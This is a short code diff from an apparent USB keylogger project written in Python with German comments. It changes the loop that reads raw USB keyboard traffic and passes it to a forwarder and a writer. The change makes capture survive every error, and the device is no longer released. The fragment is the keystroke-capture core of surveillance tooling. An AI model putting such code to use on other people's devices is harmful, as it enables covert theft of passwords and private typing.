@@ -70,16 +70,19 @@ class KeyLogger:
         if device is None:
             logging.error(f'Device is None in the run ')
         usb.util.claim_interface(device, 0)
-        try:
-            # Endlosschleife zum Abhören des USB-Verkehrs
-            while True:
-                data: any = device.read(
-                    0x81, 64
-                )  # Endpoint-Adresse und Puffergröße anpassen
-                self.__USBForwarder.send_data(data)
-                self.data_handler.write(data)
-        except KeyboardInterrupt:
-            pass
-        finally:
-            usb.util.release_interface(device, 0)
-            device.reset()
+        while True:
+            try:
+                # Endlosschleife zum Abhören des USB-Verkehrs
+                while True:
+                    data: any = device.read(
+                        0x81, 64
+                    )  # Endpoint-Adresse und Puffergröße anpassen
+                    self.__USBForwarder.send_data(data)
+                    self.data_handler.write(data)
+            except Exception as e:
+                logging.error(f"{e}")
+                pass
+        #TODO add later that we can use the keyboard again
+        # finally:
+        #     usb.util.release_interface(device, 0)
+        #     device.reset()
